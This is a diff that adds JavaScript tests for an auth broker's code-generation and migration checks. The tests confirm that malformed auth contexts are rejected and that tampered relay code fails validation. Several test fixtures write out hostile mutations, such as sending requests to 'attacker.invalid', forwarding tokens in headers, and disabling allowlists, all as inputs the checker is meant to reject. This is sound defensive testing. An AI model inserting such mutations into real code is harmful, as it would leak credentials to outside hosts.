@@ -57,6 +57,64 @@ const operations = JSON.parse(
   read('plugin/shell-business-operations.json'),
 ).operations;
 
+test('portal-only placement market operations never become device ShellAuth calls', () => {
+  const spec = JSON.parse(read('openapi/resource.yaml'));
+  const route =
+    '/api/resource/v1/catalog/placements/{placementId}/installations';
+  for (const op of Object.values(spec.paths[route])) {
+    assert.deepEqual(op['x-auth-context'], ['portal']);
+    assert(!operations.some((value) => value.operation === op.operationId));
+    assert(
+      !Object.keys(
+        JSON.parse(read('plugin/shell-business.schema.json')).$defs,
+      ).some((name) => name.includes(op.operationId)),
+    );
+  }
+});
+
+test('projection rejects malformed explicit authentication contexts without rewriting source files', () => {
+  const script = new URL(
+    '../plugin/generate-shell-business.mjs',
+    import.meta.url,
+  ).pathname.replace(/^\/([A-Za-z]:)/, '$1');
+  for (const invalid of [
+    null,
+    'portal',
+    [],
+    [1],
+    ['unknown'],
+    ['portal', 'portal'],
+  ]) {
+    // Feed the actual generator a malformed source document in memory. The repository stays read-only.
+    const hook = `import fs from 'node:fs';
+      const original = fs.readFileSync;
+      fs.readFileSync = function(path, ...options) {
+        const value = original.call(this, path, ...options);
+        if (String(path).replaceAll('\\\\', '/').endsWith('/contracts/openapi/resource.yaml')) {
+          const spec = JSON.parse(String(value));
+          spec.paths['/api/resource/v1/catalog/placements/{placementId}/installations'].get['x-auth-context'] = ${JSON.stringify(invalid)};
+          return JSON.stringify(spec);
+        }
+        return value;
+      };`;
+    const result = spawnSync(
+      process.execPath,
+      [
+        '--import',
+        'data:text/javascript,' + encodeURIComponent(hook),
+        script,
+        '--check',
+      ],
+      { encoding: 'utf8' },
+    );
+    assert.notEqual(result.status, 0);
+    assert.match(
+      result.stderr,
+      /Invalid x-auth-context: UnifiedListPlacementInstallations/,
+    );
+  }
+});
+
 test('every projected identity parameter retains its location, requirement and broker binding', () => {
   const bindings = {
     clientId: 'deviceId',
@@ -1395,6 +1453,88 @@ test('K2 migration gate allows unrelated edits and removal but rejects new or re
     );
   assert.throws(() =>
     checkPlatformMigration({ ...broker, calls: legacy.calls }, operations, {}),
+  );
+});
+
+test('AUTH-K shared node relay allows only the trusted finite Unix socket composition', () => {
+  const inventory = JSON.parse(read('plugin/shell-auth-call-sites.json'));
+  const sources = readPluginSources();
+  const broker = { ...inventory, migrationState: 'broker', calls: [] };
+  assert.doesNotThrow(() =>
+    checkPlatformMigration(broker, operations, sources),
+  );
+  const transport = 'shared/node-transport.js',
+    provider = 'shared/ports-plugin.js';
+  for (const [file, before, after] of [
+    [transport, 'socketPath,', "host: 'attacker.invalid', port: 443,"],
+    [transport, "method: 'POST'", 'method: body.method'],
+    [transport, "'/_auriga/shared-rpc/' + operation", 'body.url'],
+    [
+      transport,
+      "'content-type': 'application/json',",
+      "authorization: body.token, 'content-type': 'application/json',",
+    ],
+    [
+      transport,
+      "'content-type': 'application/json',",
+      "'Auriga-Identity': body.identity, 'content-type': 'application/json',",
+    ],
+    [transport, 'if (!operations.has(operation))', 'if (false)'],
+    [transport, "  'receive',", "  'receive', 'arbitrary',"],
+    [
+      transport,
+      'const active = new Set();',
+      'const active = new Set(); const send = request;',
+    ],
+    [provider, "process.platform !== 'linux'", 'false'],
+    [provider, 'const initial = read();', 'const initial = input;'],
+    [
+      provider,
+      'const initial = read();',
+      'const initial = read(); initial.nodeSocket = input.socket;',
+    ],
+    [
+      provider,
+      "value.nodeSocket !== root + '/control/shared-node.sock'",
+      'false',
+    ],
+    [
+      provider,
+      'const bridge = createSharedNodeTransport(initial.nodeSocket);',
+      'const bridge = createSharedNodeTransport(config.socketPath);',
+    ],
+  ]) {
+    assert.ok(sources[file].includes(before), before);
+    assert.throws(
+      () =>
+        checkPlatformMigration(broker, operations, {
+          ...sources,
+          [file]: sources[file].replace(before, after),
+        }),
+      before,
+    );
+  }
+  assert.throws(() =>
+    checkPlatformMigration(broker, operations, {
+      ...sources,
+      'untrusted.js':
+        "import { createSharedNodeTransport as relay } from './shared/node-transport.js'; relay(input.path);",
+    }),
+  );
+  assert.throws(() =>
+    checkPlatformMigration(broker, operations, {
+      ...sources,
+      [transport]:
+        sources[transport] + "\nrequest({ hostname: 'attacker.invalid' });",
+    }),
+  );
+  assert.throws(() =>
+    checkPlatformMigration(broker, operations, {
+      ...sources,
+      [transport]:
+        sources[transport] +
+        "\nconst http = await import('node:http'); http.get('https://attacker.invalid');",
+    }),
   );
 });
 
